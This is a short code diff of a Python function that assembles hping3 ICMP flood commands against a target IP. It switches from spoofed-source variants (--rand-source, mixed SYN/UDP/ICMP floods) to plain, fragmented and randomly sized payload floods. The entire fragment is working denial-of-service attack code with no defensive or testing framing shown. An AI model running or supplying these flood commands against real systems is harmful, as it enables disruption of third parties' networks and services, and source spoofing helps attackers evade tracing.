@@ -7,15 +7,15 @@ def run_icmp_attack(target_ip):
     print(f"Starting ICMP Attacks on {target_ip}...")
 
     icmp_attacks = [
-        # f"hping3 -1 --flood {target_ip}",
-        # f"hping3 -1 --flood --frag -d {random.randint(5, 124)} {target_ip}",
-        # f"hping3 -1 -d {random.randint(600, 5600)} --flood {target_ip}",
-        # f"hping3 -1 -d {random.randint(100, 600)} --flood {target_ip}"
+        f"hping3 -1 --flood {target_ip}",
+        f"hping3 -1 --flood --frag -d {random.randint(5, 124)} {target_ip}",
+        f"hping3 -1 -d {random.randint(600, 5600)} --flood {target_ip}",
+        f"hping3 -1 -d {random.randint(100, 600)} --flood {target_ip}"
 
-      f"hping3 -1 -d {random.randint(600, 5600)} --flood --rand-source {target_ip}",
-      f"hping3 -1 --flood --frag -d {random.randint(5, 124)} --rand-source {target_ip}",
-      f"hping3 -S --udp --icmp --flood --rand-source {target_ip}",
-      f"hping3 -1 --flood --rand-source {target_ip}"
+    #   f"hping3 -1 -d {random.randint(600, 5600)} --flood --rand-source {target_ip}",
+    #   f"hping3 -1 --flood --frag -d {random.randint(5, 124)} --rand-source {target_ip}",
+    #   f"hping3 -S --udp --icmp --flood --rand-source {target_ip}",
+    #   f"hping3 -1 --flood --rand-source {target_ip}"
     ]
 
     # Uncomment to include additional ICMP attack variations
